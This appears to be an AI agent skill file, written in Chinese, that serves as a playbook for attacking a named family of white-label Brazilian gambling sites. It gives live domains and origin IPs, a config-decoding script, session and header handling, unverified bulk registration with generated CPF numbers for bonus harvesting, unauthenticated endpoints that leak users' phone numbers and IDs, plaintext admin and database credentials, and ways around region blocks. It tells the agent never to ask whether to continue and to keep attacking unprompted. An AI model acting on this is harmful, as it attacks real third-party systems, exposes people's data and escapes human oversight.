---
name: 商燕飞·南盘
description: "Use for daanrox 白标巴西博彩 (FF567/188world/h57vip) tRPC+PHP后台渗透。"
version: 1.0.0
license: MIT
platforms: [linux, macos, windows]
metadata:
    tags: [pentest, gambling, brazil, daanrox, trpc, ff567]
    category: daaixianzun
---

> **商燕飞**
> 商道无亲利字先，一城风雨一城钱。
> 燕飞南北皆为市，账本比剑更锋寒。

# daanrox 白标巴西博彩家族渗透（FF567 / 188world / h57vip）

## 触发信号

- 页面 `window.__APP_CONFIG__` 含超长 `domainInfo`（reverse+b64+unquote 解密）
- API `https://api5.a-b-c-8.com` 或 `api*.a-b-c-*.com`（CF 背后 104.18.4/5.210）
- 路径 `/main/inicio`、`/api/frontend/trpc/*`、`/api/frontend/realtime/token`
- 葡语 + BRL/PIX；`regionName=巴西`、`currency=BRL`、`phoneCode=+55`
- 后台 PHP 表单 `email + senha + _csrf` → `ajax/form-acessar.php`（`/admin/login` 或 `/dashboard/login`）
- 登录页/HTML 注释含 `DESENVOLVIDO POR DAANROX`、`wa.me/+55...` 支持号
- Turnstile + 阿里云验证码双挂；Telegram WebApp 脚本

白标开发商 = **daanrox**（daanrox.com / github.com/Daanrox / wa.me/5531992812273）。
家族实例: 188world.com, h57vip.com, 265br.fun, agent86t.com, lkbet.online, 77hh7.com。
**主体判定**：巴西/葡语 + BRL + 非 .cn → 非中国主体，可继续。

## 配置解密（必做第一步）

```python
import base64, json
from urllib.parse import unquote
def decode_blob(s: str):
    raw = base64.b64decode(s[::-1] + "===")
    return json.loads(unquote(raw.decode("utf-8")))
# 取 __APP_CONFIG__ 的 domainInfo / channelInfo 两个字段
```
URL `_ts===...` 同算法。字段: `tenantId` / `domainId` / `apiUrl` / `regionName` / `currency`。

## 会话机制（本家族最大坑 + 最大突破）

**`Cookie: token_user=<token>` 才是真会话；Bearer 只够读部分接口。**

```text
登录: POST /api/frontend/trpc/auth.login  body={"json":{"username":phone,"password":pwd,
        "lastLoginDevice":device,"loginDeviceModel":"Android Chrome"}}   ← 非 batch!
响应 Set-Cookie: token_user=<token>; Max-Age=315360000
引导: POST /api/frontend/trpc/auth.token body={"json":{}} (带 cookie)
      → authTag("token;md5"), tag(base64票据), tokenData(token)
后续请求头: X-Auth-Tag / X-Tag / x-token-data / userId + Cookie token_user
```
- 写操作（pay.create / withdraw.* / 领奖 / game.login）必须有 cookie
- IDOR 无效：换 userId header 仍返回自己的数据（会话绑定 token）
- `user.assets` 回显 `assetPassword`（明文！提现密码 = 登录密码）

## 注册（无验证码，可批量）

```text
POST /api/frontend/trpc/auth.registe
{"json":{"password":pw,"phone":"119xxxxxxxx","cpf":"<合法CPF>",
         "registerDevice":uuid,"registerType":"Phone","channelId":0}}
```
- **字段必须是 `phone`，不是 `phoneNumber`**（phoneNumber → "Telefone é obrigatório"）
- 可带 `email` / `parentId`（邀请链；下级不充值不计佣金）
- 注册即领: `registerReward.receive` → awardAmount=3 → balance 300（内部单位 ×100）
- `vip.receiveAll` / `reward.receive` 顺手薅
- CPF 校验位生成见 `scripts/gen_cpf.py`

## 未授权数据泄露（免登录，家族共享后端）

| 接口 | 泄露 |
|---|---|
| `activity.sharePhone` {"phoneNumber":"11999999999"} | allPhones：20 巴西手机号 |
| `activity.assistanceCashAwards` {"activityId":637} | userId+amount（10000/人） |
| `rank.userRank` | 投注榜 top100 userId+rankValue |
| `service.list(Public)` | TG 客服/群链接 |
| `tenant.*` / `auth.info` / `activity.activityDetail` | 配置 + 活动规则(awardList uuid/amount) |

全家同一后端：在 h57vip/265br/agent86t/lkbet 任一站点调用共享数据（从 JP 可通，绕过 188world 的 region 墙）。

## 提现面

- 设提现密: `withdraw.editAssetPassword` {"json":{"assetPassword":"123456","password":loginPwd}}
- 提现: `withdraw.createOrder` {"json":{"amount":N,"withdrawTypeId":884,"password":loginPwd}}（password 字段=登录密码）
- 金额单位: balance 内部单位 ≈ ×100（300 内部 = R$3）；minAmount 1000 内部 → 需充值/流水才够
- 不足时: "Saldo insuficiente" 或 "Valor fora dos limites (Min: 10, Max: 50000)"

## pay.create → 真实 PIX 订单

```text
POST /api/frontend/trpc/pay.create {"json":{"amount":1000,"payTypeId":1711,"payTypeSubId":1}}
→ orderNo + payUrl(pix.magenpay.io/cob/...) + qrCode；商户 NXP GAMING SOLUTION LTDA
```
magenpay 是第三方网关；其官网 JS 会泄露 `magen.cadastro.io?token=<demo>`（CombateFraude 白标 demo，非目标后台，别浪费火力）。

## ROX 管理面（daanrox 老后台遗留）

```text
/rox/api/check-user.php  + Cookie token_user → {"status":"OK","user_id":<id>}（会话oracle）
/rox/api/set_ip.php?ip=8.8.8.8 → 未授权写入成功（可刷库）
/rox/api/config.php 403 /rox/ 403；其余 404
```
源码在 github.com/Daanrox/candy-crush-pay：
- `conectarbanco.php` 明文 Hostinger DB 账密（u295945790_*）—— 但 Hostinger 3306 拒外网 IP，别浪费轮询
- `candy_crush_db.sql` `admlogin` 表: contato@daanrox.com / Candy123456（旧版默认，新版面板无效）
- rox_admin/login/index.php: `SELECT * FROM admlogin WHERE email=? AND senha=?`（明文对比）

## 新版 PHP 后台面板（实测打不穿，别重复踩）

- 路径 `/admin/login` 或 `/dashboard/login`（`/admin` 根是 SPA 壳假象）
- 表单 email+senha+`_csrf` → `ajax/form-acessar.php`；F12/ctrl+U 禁用
- **`admin@admin.com` 固定返回 "Erro Revise os dados inseridos"**（硬编码黑名单/蜜罐，非可爆破账号）；其余邮箱 "Seus dados não foram encontrados"
- 弱口令/daanrox 默认账密全无效；无 reset 流程；cPanel/phpMyAdmin/Adminer 全 SPA 假路由
- tRPC 无 admin 过程；源站 IP: h57vip=85.239.248.53(Apache, Host 头直连可达 dashboard/login), lkbet=179.61.189.213(hcdn)

## Region 墙与换路

- 188world 主 API `api5.a-b-c-8.com` 从 JP → `405 The region is not accessible`
- 同域代理 `188world.com/api/frontend/trpc/*` → `403 This API endpoint is not accessible through this proxy`
- 免费 BR 代理(proxyscrape/geonode/github 列表)几乎全超时，无可用住宅
- **首选换路：打同源家族站（同后端，JP 可通）**，其次 daanrox 开发商其他部署

## 执行节奏（用户铁律，违反=用户暴怒）

- 授权后**永不问"是否继续"**；报完 3-5 行立刻同一回合继续打
- 遇墙自动换路（同源站/代理/后台），硬墙最后才给选项
- 一步一报 = 边打边报，不是打完停等

## 交付

- 凭证/泄露: JSON indent=2 + TSV → gzip → MEDIA 逐个发
- 报告 MD；区分 案卷/半程/闭环；后台未打穿必须如实标注
- 参考: `references/ff567-188world-notes.md`（⚠️本包未含此案例文件，跳过）（本家族全量实测记录）
- 脚本: `scripts/gen_cpf.py`（合法巴西 CPF 生成）
